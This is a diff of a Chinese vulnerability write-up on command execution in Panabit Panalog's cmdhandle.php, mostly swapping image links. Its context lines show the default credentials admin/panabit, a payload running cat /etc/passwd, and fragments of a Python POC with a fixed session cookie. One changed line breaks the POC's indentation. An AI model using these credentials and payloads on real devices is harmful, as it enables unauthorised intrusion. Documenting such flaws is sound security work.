@@ -20,7 +20,7 @@ Panabit Panalog cmdhandle.php 存在后台命令执行漏洞，攻击者可以�
 
 登录页面如下
 
-![](image/pa-5.png)
+![](http://wikioss.peiqi.tech/vuln/pa-5.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 默认账号密码为：**admin/panabit**
 
@@ -47,7 +47,7 @@ Cookie: cloud_limit=20; cloud_left=block; PHPSESSID=9lpglosgab794j5ouvv0sg7q73
 cmd=cat%2520%252Fetc%252Fpasswd
 ```
 
-![](image/pa-6.png)
+![](http://wikioss.peiqi.tech/vuln/pa-6.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## 漏洞POC
 
@@ -72,7 +72,7 @@ def title():
 
 def POC_1(target_url):
     vuln_url = target_url + "/login.php"
-    cookie = "PHPSESSID=111111111111111111111peiqi"
+        cookie = "PHPSESSID=111111111111111111111peiqi"
     headers = {
         "Content-Type": "application/x-www-form-urlencoded",
         "Cookie": cookie
@@ -139,4 +139,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](image/pa-7.png)
+![](http://wikioss.peiqi.tech/vuln/pa-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
